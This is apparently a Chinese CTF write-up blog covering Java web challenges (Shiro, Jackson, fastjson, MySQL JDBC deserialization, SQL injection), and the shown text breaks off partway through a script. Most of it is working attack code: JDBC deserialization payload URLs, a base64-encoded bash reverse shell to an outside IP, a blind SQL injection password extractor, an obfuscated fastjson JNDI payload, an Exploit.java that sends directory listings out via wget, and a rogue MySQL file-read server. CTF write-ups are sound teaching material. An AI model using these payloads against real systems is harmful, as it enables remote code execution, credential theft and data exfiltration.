main(String[] args) throws Exception&#123; DatabaseInfo obj = new DatabaseInfo(); obj.setHost(&quot;1.1.1.1&quot;); obj.setPort(&quot;3307&quot;); obj.setUsername(&quot;root&quot;); obj.setPassword(&quot;root&amp;allowLoadLocalInfile=true&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;); ClassLoader classLoader = obj.getClass().getClassLoader(); Class[] interfaces = obj.getClass().getInterfaces(); InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(obj); Info proxy = (Info) Proxy.newProxyInstance(classLoader,interfaces,infoInvocationHandler); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(proxy); byte[] bytes = bos.toByteArray(); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; JDBC反序列化各个版本的payload: 1238.x: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;root&amp;password&#x3D;password6.x: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;root&amp;password&#x3D;password&gt;&#x3D;5.1.11: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;root&amp;password&#x3D;password 在版本 &gt;= 8.0.20, &gt;= 5.1.49 中, 此漏洞已经被修复,https://github.com/mysql/mysql-connector-j/commit/de7e1af306ffbb8118125a865998f64ee5b35b1bhttps://github.com/mysql/mysql-connector-j/commit/13f06c38fb68757607c460789196e3f798d506f2 [NPUCTF2020]EzShirowriteup参考：https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/m0on&#39;s-writeup.md 当时比赛貌似没给源码 给了pom.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.22.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;shiro-test&lt;/artifactId&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;mainClass&gt;com.lfy.ctf.Application&lt;/mainClass&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-web&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-core&lt;/artifactId&gt; &lt;version&gt;1.2.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 看到有CC还是有漏洞的版本 提示POST /json 访问跳转到/login 看到rememberMe立马享道shiro CVE-2020-1957绕过： payload: 1&#x2F;;&#x2F;json&#x2F; 直接POST个true发现 Jackson 是一个 Java 的用来处理 JSON 格式数据的类库，性能非常好 赛后复现 还是看看代码怎么实现的比较好 找到半天没找到源码 没办法 去docker里找吧 1docker pull sqxssss/javalfy:latest 把/opt/ctf.jar拷出来 看下对应/json的控制器 123456789101112131415161718192021222324252627package com.lfy.ctf.controller;import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;import org.springframework.web.bind.annotation.RequestBody;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class BypassTestController &#123; public BypassTestController() &#123; &#125; @RequestMapping( value = &#123;&quot;/json&quot;&#125;, method = &#123;RequestMethod.POST&#125; ) public String json(@RequestBody String info) throws IOException &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); System.out.println(info); Object o = mapper.readValue(info, Object.class); mapper.writeValueAsString(o); return &quot;jackson interface&quot;; &#125;&#125; @RequestBody注解用来接收用户提交的json数据的 并且只能有一个 json方法大概意思就是读取用户提交的json转换成java对象 可以参考jackson的用法：https://blog.csdn.net/blwinner/article/details/99942211 关于jackson的漏洞可参考： http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/ https://yoga7xm.top/2019/07/30/jackson jackson反序列化 + JNDI注入 + LDAP返回序列化数据触发本地Gadget Bypass jdk 8u_191限制 绕过方法参考：https://paper.seebug.org/942/#ldapgadget 工具使用：https://github.com/wh1t3p1g/ysomap 1234567use exploit LDAPLocalChainListenerset lport 9001use payload CommonsCollections8use bullet TransformerBulletset version 3set args &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuMTUyLjEzMi4xNi85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;run 然后提交就行 监听 就能收到shell了 payload: 1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap://localhost:43658/Calc&quot;&#125;] [VNCTF 2021]realezjvavwriteupjava题 开局个登陆框 sql注入？ 测得在password位置有注入 一个单引号 两个单引号正常 fuzz一下 发现过滤的并不多 但是延时函数过滤了 又不能布尔盲注 搜了下 可以笛卡尔积盲注 脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsurl=&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 # p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) # p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) data1=&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;password&#x27;:p1&#125; data2=&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;password&#x27;:p2&#125; try: print(i,mid) r1=requests.post(url,data=data1,timeout=1) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data2,timeout=1) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break# user# id,username,password# no_0ne_kn0w_th1s 超时时间要自己测下 有时候比较大 有时候比较小 可能跑的人太多了吧 登陆之后发现 测了下可以目录穿越 任意文件读取 读pom.xml 1&#x2F;searchimage?img&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;pom.xml 看到是fastjson 刚好是有漏洞的版本 并且创建角色的时候刚好是json字符串 参考：https://github.com/CaijiOrz/fastjson-1.2.47-RCE 打一下payload 发现被拦了 前两天刚好在p神的星球看到 刚好可以绕过 修改后的payload: 1roleJson=&#123;&quot;name&quot;:&#123;&quot;\\x40\\x74\\x79\\x70\\x65&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c&quot;&#125;,&quot;x&quot;:&#123;&quot;\\x40\\x74\\x79\\x70\\x65&quot;:&quot;\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c&quot;,&quot;dataSourceName&quot;:&quot;ldap://1.1.1.1:1389/Exploit&quot;,&quot;\\x61\\x75\\x74\\x6f\\x43\\x6f\\x6d\\x6d\\x69\\x74&quot;:true&#125;&#125; 貌似没bash 用dnslog带出来的flag 具体流程参见那篇文章就行了 Exploit.java 12345678910111213public class Exploit&#123; public Exploit()&#123; try&#123; Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;wget http://1.1.1.1:900/?a=$(ls /|base64 -w0&quot;&#125;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; D^3CTF non RCE参考： https://meizjm3i.github.io/2021/03/07/Servlet%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E7%AB%9E%E4%BA%89%E4%BB%A5%E5%8F%8AAsjpectJWeaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget%E6%9E%84%E9%80%A0-AntCTFxD-3CTF-non-RCE%E9%A2%98%E8%A7%A3/ https://guokeya.github.io/post/o7CJqUnTn/ https://mp.weixin.qq.com/s/cGZFawgND02EL4OTopK9zQ writeup先看下pom.xml ysoserial最近更新的一个gadget 可以任意文件写入 刚好1.9.2版本 具体参考：https://y4er.com/post/ysoserial-aspectjweaver-gadget/ JDBC驱动版本是5.1.48 存在JDBC反序列化漏洞：https://github.com/fnmsd/MySQL_Fake_Server 再看下目录结构 这里有几个重要的文件 这里先贴出来 servlet/AdminServlet.java：鉴权之后可以传入一个jdbc链接 会尝试连接目标jdbc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/** * Alipay.com Inc. Copyright (c) 2004-2021 All Rights Reserved. */package servlet;import checker.BlackListChecker;import logger.AttackerLogger;import javax.servlet.ServletException;import javax.servlet.ServletOutputStream;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.sql.DriverManager;import java.util.logging.Level;/** * * @author fantasyC4t * @version : AdminServlet.java, v 0.1 2021年03月01日 4:47 下午 fantasyC4t Exp $ */@WebServlet( name = &quot;AdminServlet&quot;, urlPatterns = &#123;&quot;/admin/*&quot;&#125;)public class AdminServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; if (req.getRequestURI().startsWith(&quot;/admin/importData&quot;)) &#123; AttackerLogger.getLogger().log(Level.INFO,req.getRemoteAddr()+&quot; phase2, requestURI=&quot;+req.getRequestURI()); String databaseType = req.getParameter(&quot;databaseType&quot;); String jdbcUrl = req.getParameter(&quot;jdbcUrl&quot;); if (databaseType == null || jdbcUrl == null) &#123; outputResponse(resp, &quot;The parameter databaseType or jdbcUrl can not be null!&quot;); return; &#125; if (!BlackListChecker.check(jdbcUrl)) &#123; System.out.println(&quot;detect attacking!&quot;); resp.sendError(HttpServletResponse.SC_BAD_REQUEST, &quot;The jdbc url contains illegal character!&quot;); return; &#125; try &#123; if ((&quot;mysql&quot;).equals(databaseType)) &#123; AttackerLogger.getLogger().log(Level.INFO,req.getRemoteAddr()+&quot; phase3, jdbcUrl=&quot;+jdbcUrl); DriverManager.setLoginTimeout(5); Class.forName(&quot;com.mysql.jdbc.Driver&quot;); DriverManager.getConnection(jdbcUrl); outputResponse(resp, &quot;ok&quot;); &#125; &#125; catch (Exception e) &#123; outputResponse(resp, &quot;The jdbc url &quot; + jdbcUrl + &quot; connects error.&quot;); &#125; &#125; &#125; private void outputResponse(HttpServletResponse resp, String output) throws IOException &#123; ServletOutputStream out = resp.getOutputStream(); out.write(output.getBytes()); out.flush(); out.close(); &#125;&#125; filter/LoginFilter.java：用于对/admin/路由进行鉴权操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * Alipay.com Inc. Copyright (c) 2004-2021 All Rights Reserved. */package filter;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;/** * * @author fantasyC4t * @version : AdminFilter.java, v 0.1 2021年03月01日 7:18 下午 fantasyC4t Exp $ */@WebFilter( filterName = &quot;LoginFilter&quot;, urlPatterns = &#123;&quot;/admin/*&quot;&#125;)public class LoginFilter implements Filter &#123; //The true password has being removed from the source code for security. private static final String PASSWORD = &quot;&quot;; @Override public void init(FilterConfig var1) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest req = (HttpServletRequest) servletRequest; HttpServletResponse res = (HttpServletResponse) servletResponse; String password = req.getParameter(&quot;password&quot;); if (password == null) &#123; res.sendError( HttpServletResponse.SC_UNAUTHORIZED, &quot;The password can not be null!&quot;); return; &#125; try &#123; //you can&#x27;t get this password forever, because the author has forgotten it. if (password.equals(PASSWORD)) &#123; filterChain.doFilter(servletRequest, servletResponse); &#125; else &#123; res.sendError(HttpServletResponse.SC_UNAUTHORIZED, &quot;The password is not correct!&quot;); &#125; &#125; catch (Exception e) &#123; res.sendError( HttpServletResponse.SC_BAD_REQUEST, &quot;Oops!&quot;); &#125; &#125; @Override public void destroy() &#123; &#125;&#125; filter/AntiUrlAttackFilter.java：全局过滤器 对路由里的一些非法字符进行替换等操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * Alipay.com Inc. Copyright (c) 2004-2021 All Rights Reserved. */package filter;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;/** * * @author fantasyC4t * @version : JdbcUrlFilter.java, v 0.1 2021年03月01日 7:41 下午 fantasyC4t Exp $ */@WebFilter( filterName = &quot;AntiUrlAttackFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)public class AntiUrlAttackFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest req = (HttpServletRequest) servletRequest; HttpServletResponse res = (HttpServletResponse) servletResponse; String url = req.getRequestURI(); // 对非法字符替换 if (url.contains(&quot;../&quot;) &amp;&amp; url.contains(&quot;..&quot;) &amp;&amp; url.contains(&quot;//&quot;)) &#123; res.sendError(HttpServletResponse.SC_BAD_REQUEST, &quot;The &#x27;.&#x27; &amp; &#x27;/&#x27; is not allowed in the url&quot;); &#125; else if (url.contains(&quot;\\20&quot;)) &#123; res.sendError(HttpServletResponse.SC_BAD_REQUEST, &quot;The empty value is not allowed in the url.&quot;); &#125; else if (url.contains(&quot;\\\\&quot;)) &#123; res.sendError(HttpServletResponse.SC_BAD_REQUEST, &quot;The &#x27;\\\\&#x27; is not allowed in the url.&quot;); &#125; else if (url.contains(&quot;./&quot;)) &#123; String filteredUrl = url.replaceAll(&quot;./&quot;, &quot;&quot;); req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse); &#125; else if (url.contains(&quot;;&quot;)) &#123; String filteredUrl = url.replaceAll(&quot;;&quot;, &quot;&quot;); req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse); &#125; else &#123; filterChain.doFilter(servletRequest, servletResponse); &#125; &#125; @Override public void destroy() &#123; &#125;&#125; checker/BlackListChecker.java：对传入的jdbc字符串进行黑名单检测类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * Alipay.com Inc. Copyright (c) 2004-2021 All Rights Reserved. */package checker;/** * * @author fantasyC4t * @version : BlackListChecker.java, v 0.1 2021年03月01日 9:59 下午 fantasyC4t Exp $ *//** * Alipay.com Inc. Copyright (c) 2004-2021 All Rights Reserved. */import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;/** * * @author fantasyC4t * @version : BlackListChecker.java, v 0.1 2021年03月01日 9:59 下午 fantasyC4t Exp $ */public class BlackListChecker &#123; public static BlackListChecker blackListChecker; public String[] blackList = new String[] &#123;&quot;%&quot;, &quot;autoDeserialize&quot;&#125;; public DataMap checkDataMap; public volatile String toBeChecked; public BlackListChecker() &#123; List&lt;String&gt; jdbcBlackList = new ArrayList&lt;&gt;(); jdbcBlackList.add(blackList[0]); jdbcBlackList.add(blackList[1]); Map&lt;String, List&lt;String&gt;&gt; checkMap = new HashMap&lt;&gt;(); checkMap.put(&quot;jdbc&quot;, jdbcBlackList); this.checkDataMap = new DataMap(checkMap); &#125; public void setToBeChecked(String s) &#123; this.toBeChecked = s; &#125; public static BlackListChecker getBlackListChecker() &#123; if (blackListChecker == null)&#123; blackListChecker = new BlackListChecker(); &#125; return blackListChecker; &#125; public static boolean check(String s) &#123; BlackListChecker blackListChecker = getBlackListChecker(); blackListChecker.setToBeChecked(s); return blackListChecker.doCheck(); &#125; public boolean doCheck() &#123; for (String s : blackList) &#123; if (toBeChecked.contains(s)) &#123; return false; &#125; &#125; return true; &#125; public void addCheckList(String key, List checkList)&#123; if(this.checkDataMap.containsKey(key))&#123; List list = (List) this.checkDataMap.get(key); if (!list.containsAll(checkList)) &#123; list.add(checkList); &#125; &#125;else &#123; this.checkDataMap.put(key, checkList); &#125; &#125; public void removeCheckList(String key)&#123; this.checkDataMap.remove(key); &#125;&#125; checker/DataMap.java：反序列化时依赖的一个类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204/** * Alipay.com Inc. Copyright (c) 2004-2021 All Rights Reserved. */package checker;/** * * @author fantasyC4t * @version : DataMap.java, v 0.1 2021年03月03日 11:19 上午 th1s Exp $ */import java.io.Serializable;import java.util.*;public class DataMap implements Map, Serializable &#123; private Map wrapperMap; private Map values; public DataMap() &#123; this.wrapperMap = new HashMap(); this.values = null; &#125; public DataMap(Map wrapperMap, Map values) &#123; this.wrapperMap = wrapperMap; this.values = values; &#125; public DataMap(Map wrapperMap) &#123; this.wrapperMap = wrapperMap; this.values = null; &#125; static int hash(Object one) &#123; return one == null ? 0 : one.hashCode(); &#125; static boolean equality(Object one, Object two) &#123; return one == null ? two == null : one.equals(two); &#125; protected Map getMap() &#123; return this.wrapperMap; &#125; public void clear() &#123; this.wrapperMap.clear(); &#125; public boolean containsKey(Object key) &#123; return this.wrapperMap.containsKey(key); &#125; public boolean containsValue(Object value) &#123; return this.wrapperMap.containsValue(value); &#125; public Set entrySet() &#123; return new DataMap.EntrySet(); &#125; public Object get(Object key) &#123; Object v = null; if (this.values != null) &#123; v = this.values.get(key); &#125; if(v == null)&#123; v = this.wrapperMap.get(key); if (this.values == null) &#123; this.values = new HashMap(this.wrapperMap.size()); &#125; this.values.put(key, v); &#125; return v; &#125; public boolean isEmpty() &#123; return this.wrapperMap.isEmpty(); &#125; public Set keySet() &#123; return this.wrapperMap.keySet(); &#125; public Object put(Object key, Object value) &#123; return this.wrapperMap.put(key, value); &#125; public void putAll(Map mapToCopy) &#123; this.wrapperMap.putAll(mapToCopy); &#125; public Object remove(Object key) &#123; return this.wrapperMap.remove(key); &#125; public int size() &#123; return this.wrapperMap.size(); &#125; public Collection values() &#123; return this.wrapperMap.values(); &#125; public boolean equals(Object object) &#123; return object == this ? true : this.wrapperMap.equals(object); &#125; private final class Entry implements java.util.Map.Entry, Serializable &#123; private final Object key; private Object value; Entry(Object k) &#123; this.key = k; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; if (this.value == null) &#123; this.value = DataMap.this.get(this.key); &#125; return this.value; &#125; public Object setValue(Object value) &#123; throw new UnsupportedOperationException(); &#125; public String toString() &#123; return this.getKey() + &quot;=&quot; + this.getValue(); &#125; public int hashCode() &#123; return DataMap.hash(this.getKey()) ^ DataMap.hash(this.getValue()); &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof java.util.Map.Entry)) &#123; return false; &#125; else &#123; java.util.Map.Entry&lt;?, ?&gt; other = (java.util.Map.Entry)obj; return DataMap.equality(this.getKey(), other.getKey()) &amp;&amp; DataMap.equality(this.getValue(), other.getValue()); &#125; &#125; &#125; public int hashCode() &#123; return this.wrapperMap.hashCode(); &#125; public String toString() &#123; return this.wrapperMap.toString(); &#125; private final class EntryIterator implements Iterator&lt;Map.Entry&gt; &#123; private final Iterator iter; private Object last; EntryIterator() &#123; this.iter = DataMap.this.wrapperMap.keySet().iterator(); &#125; public boolean hasNext() &#123; return this.iter.hasNext(); &#125; public java.util.Map.Entry next() &#123; this.last = this.iter.next(); return DataMap.this.new Entry(this.last); &#125; public void remove() &#123; this.iter.remove(); if (DataMap.this.values != null) &#123; DataMap.this.values.remove(this.last); &#125; &#125; &#125; private final class EntrySet extends AbstractSet&lt;Map.Entry&gt; &#123; EntrySet() &#123; &#125; public Iterator&lt;java.util.Map.Entry&gt; iterator() &#123; return DataMap.this.new EntryIterator(); &#125; public int size() &#123; return DataMap.this.size(); &#125; &#125;&#125; 绕过权限限制由于filter/AntiUrlAttackFilter.java对全局url有效 路由/a;dmin/importData替换后为/admin/importData从而绕过filter/LoginFilter.java的鉴权 如下图： Mysql客户端任意文件读取这个版本的JDBC的驱动貌似又点问题 直接使用那几个都没办法读取文件 最后找到这篇文章：https://www.freebuf.com/articles/web/251626.html 大概意思就是mysql jdbc 5.x 有error类型为 Unexpected exception encountered during query可以使用这个payload: https://github.com/yang8e/jdbc_mysql_redfile 123456789101112131415161718192021222324252627282930313233343536373839# -*- coding:utf-8 -*-__author__ = &#x27;leezp&#x27;import socketimport loggingimport sysimport base64# 读取mysql客户端本地文件，目前的脚本有读取长度限制,特别大的文件读取不完整filename = sys.argv[1]# filename=&quot;/root/Desktop/pass.txt&quot;sv = socket.socket()sv.bind((&quot;&quot;, 3306))sv.listen(5)conn, address = sv.accept()print(&quot;Conn from: %s:%d&quot;%address)# 1 Greetingconn.sendall(&quot;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x37\\x2e\\x33\\x30\\x00\\x19\\x00\\x00\\x00\\x18\\x5b\\x10\\x16\\x2d\\x4e\\x3b\\x7b\\x00\\xff\\xff\\x08\\x02\\x00\\xff\\xc1\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x78\\x42\\x40\\x67\\x53\\x2d\\x55\\x52\\x0e\\x01\\x29\\x26\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot;)conn.recv(9999)# 2 Accept all authenticationsconn.sendall(&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot;)print(&quot;auth okay&quot;)conn.recv(9999)# 3 read file# wantfile = chr(len(filename) + 1) + &quot;\\x00\\x00\\x01\\xFB&quot; + filename# print(wantfile)aaa = &quot;\\x01\\x00\\x00\\x01\\x14\\x2e\\x00\\x00\\x02\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x18\\x61\\x75\\x74\\x6f\\x5f\\x69\\x6e\\x63\\x72\\x65\\x6d\\x65\\x6e\\x74\\x5f\\x69\\x6e\\x63\\x72\\x65\\x6d\\x65\\x6e\\x74\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\x2a\\x00\\x00\\x03\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x14\\x63\\x68\\x61\\x72\\x61\\x63\\x74\\x65\\x72\\x5f\\x73\\x65\\x74\\x5f\\x63\\x6c\\x69\\x65\\x6e\\x74\\x00\\x0c\\x21\\x00\\x0c\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x2e\\x00\\x00\\x04\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x18\\x63\\x68\\x61\\x72\\x61\\x63\\x74\\x65\\x72\\x5f\\x73\\x65\\x74\\x5f\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x00\\x0c\\x21\\x00\\x0c\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x2b\\x00\\x00\\x05\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x15\\x63\\x68\\x61\\x72\\x61\\x63\\x74\\x65\\x72\\x5f\\x73\\x65\\x74\\x5f\\x72\\x65\\x73\\x75\\x6c\\x74\\x73\\x00\\x0c\\x21\\x00\\x0c\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x2a\\x00\\x00\\x06\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x14\\x63\\x68\\x61\\x72\\x61\\x63\\x74\\x65\\x72\\x5f\\x73\\x65\\x74\\x5f\\x73\\x65\\x72\\x76\\x65\\x72\\x00\\x0c\\x21\\x00\\x12\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x26\\x00\\x00\\x07\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x10\\x63\\x6f\\x6c\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x5f\\x73\\x65\\x72\\x76\\x65\\x72\\x00\\x0c\\x21\\x00\\x33\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x22\\x00\\x00\\x08\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x0c\\x69\\x6e\\x69\\x74\\x5f\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x00\\x0c\\x21\\x00\\x00\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x29\\x00\\x00\\x09\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x13\\x69\\x6e\\x74\\x65\\x72\\x61\\x63\\x74\\x69\\x76\\x65\\x5f\\x74\\x69\\x6d\\x65\\x6f\\x75\\x74\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\x1d\\x00\\x00\\x0a\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x07\\x6c\\x69\\x63\\x65\\x6e\\x73\\x65\\x00\\x0c\\x21\\x00\\x09\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x2c\\x00\\x00\\x0b\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x16\\x6c\\x6f\\x77\\x65\\x72\\x5f\\x63\\x61\\x73\\x65\\x5f\\x74\\x61\\x62\\x6c\\x65\\x5f\\x6e\\x61\\x6d\\x65\\x73\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x0